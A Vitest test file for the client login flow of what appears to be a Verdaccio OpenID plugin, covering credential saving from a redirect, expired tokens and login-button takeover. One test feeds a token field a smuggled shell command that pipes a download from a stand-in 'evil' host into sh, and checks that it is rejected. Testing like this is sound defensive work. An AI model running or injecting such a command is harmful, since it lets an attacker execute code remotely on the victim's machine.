// @vitest-environment jsdom
/**
 * Tests for the client entry point: the login redirect, the expired session,
 * and the two ways the login button is taken over.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

const { clearCredentials, isUITokenExpired, saveCredentials } = vi.hoisted(() => ({
  clearCredentials: vi.fn(),
  isUITokenExpired: vi.fn(() => false),
  saveCredentials: vi.fn(),
}));

vi.mock("@/client/plugin/credentials", async () => {
  const actual = await vi.importActual<typeof import("@/client/plugin/credentials")>("@/client/plugin/credentials");

  return {
    ...actual,
    clearCredentials,
    isUITokenExpired,
    saveCredentials,
    isValidCredentials: actual.isValidCredentials,
  };
});

import { init } from "@/client/plugin/init";

const HEADER = `<button type="button" data-testid="header--button-login">Sign in</button>`;

function setLocation(search: string): void {
  vi.stubGlobal("location", {
    search,
    pathname: "/",
    host: "localhost:4873",
    protocol: "http:",
    assign: vi.fn(),
    reload: vi.fn(),
  });
}

describe("init", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    isUITokenExpired.mockReturnValue(false);
    document.body.innerHTML = HEADER;
    window.__VERDACCIO_BASENAME_UI_OPTIONS = { base: "https://registry.example.com/" } as never;
    window.__VERDACCIO_OPENID_OPTIONS = { keepPasswdLogin: false, loginButtonText: "Login with OpenID Connect" };
    setLocation("");
    vi.stubGlobal("history", { replaceState: vi.fn() });
  });

  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it("saves the credentials from the redirect and reloads without them", () => {
    setLocation("?username=tom&uiToken=ui-token&npmToken=npm-token");

    init();

    expect(saveCredentials).toHaveBeenCalledWith({
      username: "tom",
      uiToken: "ui-token",
      npmToken: "npm-token",
    });
    expect(history.replaceState).toHaveBeenCalledWith(null, "", "/");
    expect(location.reload).toHaveBeenCalled();
  });

  it("ignores a redirect whose tokens are not tokens", () => {
    setLocation("?username=tom&uiToken=ui-token&npmToken=$(curl%20evil%7Csh)");

    init();

    expect(saveCredentials).not.toHaveBeenCalled();
  });

  it("survives a malformed query string and still takes over the login button", () => {
    setLocation("?%");

    expect(() => init()).not.toThrow();

    document.querySelector<HTMLElement>('[data-testid="header--button-login"]')!.click();

    expect(location.assign).toHaveBeenCalledWith("https://registry.example.com/-/oauth/authorize");
  });

  it("clears the stored credentials when the UI token expired", () => {
    isUITokenExpired.mockReturnValue(true);

    init();

    expect(clearCredentials).toHaveBeenCalled();
  });
});
